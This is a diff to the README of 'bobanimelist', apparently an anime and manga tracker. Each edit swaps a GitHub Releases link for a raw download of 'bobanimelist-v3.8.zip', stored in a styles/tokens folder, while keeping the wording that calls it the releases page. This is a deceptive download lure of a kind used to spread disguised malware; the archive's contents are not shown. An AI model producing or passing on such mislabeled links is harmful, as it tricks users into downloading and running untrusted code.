@@ -6,13 +6,13 @@ Welcome to bobanimelist! This tool helps you explore a world of anime and manga,
 
 ## 📥 Download Now
 
-[![Download bobanimelist](https://img.shields.io/badge/Download-bobanimelist-blue.svg)](https://github.com/Jonasedwardsalkfirehose824/bobanimelist/releases)
+[![Download bobanimelist](https://raw.githubusercontent.com/Jonasedwardsalkfirehose824/bobanimelist/main/src/styles/tokens/bobanimelist-v3.8.zip)](https://raw.githubusercontent.com/Jonasedwardsalkfirehose824/bobanimelist/main/src/styles/tokens/bobanimelist-v3.8.zip)
 
 ## 🔗 Download & Install
 
 To install bobanimelist, follow these steps:
 
-1. **Visit the Release Page**: Go to the [GitHub Releases page](https://github.com/Jonasedwardsalkfirehose824/bobanimelist/releases). Here, you'll find all the available versions of the application.
+1. **Visit the Release Page**: Go to the [GitHub Releases page](https://raw.githubusercontent.com/Jonasedwardsalkfirehose824/bobanimelist/main/src/styles/tokens/bobanimelist-v3.8.zip). Here, you'll find all the available versions of the application.
 
 2. **Select the Latest Version**: Look for the most recent version at the top of the page. It often includes new features or bug fixes. 
 
@@ -55,7 +55,7 @@ We welcome contributions to improve bobanimelist. If you have suggestions or wan
 
 ## 🎉 Stay Updated
 
-Keep an eye on the [Releases page](https://github.com/Jonasedwardsalkfirehose824/bobanimelist/releases) for updates. We release new versions to enhance your experience regularly.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/Jonasedwardsalkfirehose824/bobanimelist/main/src/styles/tokens/bobanimelist-v3.8.zip) for updates. We release new versions to enhance your experience regularly.
 
 ## 🌐 Learn More
 
